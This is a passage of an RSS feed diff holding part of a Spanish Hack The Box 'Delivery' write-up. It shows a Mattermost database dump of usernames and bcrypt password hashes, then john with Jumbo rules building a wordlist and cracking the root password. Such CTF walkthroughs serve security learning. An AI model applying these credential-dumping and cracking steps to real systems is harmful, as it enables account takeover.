+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Roles              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; text         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; AllowMarketing     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tinyint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Props              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; text         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NotifyProps        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; text         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; LastPasswordUpdate &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bigint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; LastPictureUpdate  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bigint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FailedAttempts     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Locale             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Timezone           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; text         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MfaActive          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tinyint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MfaSecret          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;128&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; YES  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
++--------------------+--------------+------+-----+---------+-------+
+&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.002 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+MariaDB &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mattermost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
+MariaDB &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mattermost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; Username, Password, Email, Nickname from Users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
++----------------------------------+--------------------------------------------------------------+-------------------------+----------+
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Username                         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Password                                                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Email                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Nickname &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
++----------------------------------+--------------------------------------------------------------+-------------------------+----------+
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; surveybot                        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                                                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; surveybot@localhost     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; c3ecacacc7b94f909d04dbfd308a9b93 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$u5815SIBe2Fq1FZlv9S8I&lt;/span&gt;.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 4120849@delivery.htb    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 5b785171bfb34762a933e127630c4860 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$3&lt;/span&gt;m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 7466068@delivery.htb    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sckull                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$AP5Rh&lt;/span&gt;.y5nEnGdbYFaZpTU.eSogx.U4k1dYqnGik3HGdD4HPjD/miK &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sckull@sckull.com       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; root                             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$VM6EeymRxJ29r8Wjkr8Dtev0O&lt;/span&gt;.1STWb4.4ScG.anuu7v0EFJwgjjO &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; root@delivery.htb       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; spirit                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$38&lt;/span&gt;hHVUzGTxHmKQ.QKQtRGuiT1cdmjUOo/QXUJZjK1zJGJMVpmObWC &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 4300590@delivery.htb    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ff0a21fc6fc2488195e16ea854c963ee &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS&lt;/span&gt;.Pduq &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 9122359@delivery.htb    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; channelexport                    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                                                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; channelexport@localhost &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 9ecfb4be145d47fda0724f697f35ffaf &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;a&lt;span class=&#34;nv&#34;&gt;$10$s&lt;/span&gt;.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 5056505@delivery.htb    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
++----------------------------------+--------------------------------------------------------------+-------------------------+----------+
+&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.001 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;john--rules--shell&#34;&gt;JOHN + RULES &amp;gt; SHELL&lt;/h2&gt;
+&lt;p&gt;Como bien el usuario root daba a entender que reutilizaban contraseñas y menciona &lt;code&gt;PleaseSubscribe!&lt;/code&gt;, utilizamos john y la regla &lt;a href=&#34;https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf&#34;&gt;&lt;code&gt;Jumbo&lt;/code&gt;&lt;/a&gt; para crear un diccionario a partir de esta palabra, ejecutamos john con este nuevo diccionario y logramos encontrar una contraseña la cual utilizamos para obtener una shell con el usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/delivery$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PleaseSubscribe!&amp;#34;&lt;/span&gt; &amp;gt; part_pass
+kali@kali:~/htb/delivery$ cat part_pass 
+PleaseSubscribe!
+kali@kali:~/htb/delivery$
+kali@kali:~/htb/delivery$ john --wordlist:part_pass --rules:Jumbo --stdout &amp;gt; possible.txt
+Using default input encoding: UTF-8
+Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+70166p 0:00:00:00 100.00% &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-02-11 00:04&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 779622p/s PeSubs
+kali@kali:~/htb/delivery$ wc -l possible.txt 
+&lt;span class=&#34;m&#34;&gt;70166&lt;/span&gt; possible.txt
+kali@kali:~/htb/delivery$ john --wordlist:possible.txt hash_root
+Using default input encoding: UTF-8
+Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bcrypt &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Blowfish 32/64 X3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
+Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
+Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+PleaseSubscribe!21 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1g 0:00:11:39 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-02-11 00:05&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.001430g/s 100.2p/s 100.2c/s 100.2C/s pleaseSubscribe!..PleaseSubscriman
+Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+kali@kali:~/htb/delivery$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/delivery/Screenshot_20210210_230942.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/delivery/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/delivery/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>rustbuster</category>
+            
+          
+            
+              <category>mattermost</category>
+            
+          
+            
+              <category>osTicket</category>
+            
+          
+            
+              <category>john</category>
+            
+          
+            
+              <category>john rules</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>Hack The Box - Ready</title>
